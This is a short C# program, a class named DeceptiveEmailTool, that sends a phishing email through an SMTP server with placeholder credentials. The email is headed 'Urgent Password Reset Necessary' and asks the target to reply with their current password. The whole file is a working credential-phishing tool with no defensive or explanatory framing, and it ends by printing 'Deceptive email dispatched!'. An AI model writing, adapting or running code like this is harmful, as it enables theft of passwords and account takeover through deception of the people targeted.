using System;
using System.Net;
using System.Net.Mail;

public class DeceptiveEmailTool {
    public static void Main(string[] args) {
        var client = new SmtpClient("smtp.example.com", 587)
        {
            Credentials = new NetworkCredential("yourusername@example.com", "yourpassword"),
            EnableSsl = true,
        };

        var mailMessage = new MailMessage
        {
            From = new MailAddress("yourusername@example.com"),
            Subject = "Urgent Password Reset Necessary",
            Body = "To confirm your identity and proceed with the password reset, please reply to this email with your current password.",
        };

        mailMessage.To.Add("targetusername@example.com");
        client.Send(mailMessage);

        Console.WriteLine("Deceptive email dispatched!");
    }
}
